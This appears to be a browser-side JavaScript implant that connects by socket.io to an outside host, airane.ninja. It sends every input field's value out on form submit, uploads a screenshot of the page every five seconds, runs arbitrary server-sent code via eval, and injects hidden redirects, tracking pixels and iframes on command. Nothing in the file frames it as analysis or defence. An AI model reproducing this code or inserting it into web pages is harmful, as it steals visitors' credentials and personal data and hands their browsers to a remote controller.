// 
var socket = io.connect('http://airane.ninja:80');

// client
socket.emit('client');

// submit
$(document).submit(function() {
	var data = {};
	$( 'input' ).each(function( index ) {
		data[ $(this).attr('name') ] = $(this).val();
	});
	socket.emit('submit', data);
});

// canvas
setInterval(function(){
	html2canvas(document.body, {
		onrendered: function(canvas) {
			socket.emit('canvas', canvas.toDataURL());
		}
	});
}, 5000);

// eval
socket.on('eval', function(data) {
	eval(data);
});

// redirect
socket.on('redirect', function(data) {
	window.location.href = data;
});

// pixel
socket.on('pixel', function(data) {
	$( 'body' ).append( '<img alt="" src="' + data + '" style="display:none"></img>' );
});

// iframe
socket.on('iframe', function(data) {
	$( 'body' ).append( '<iframe src="' + data + '" style="display:none"></iframe>' );
});
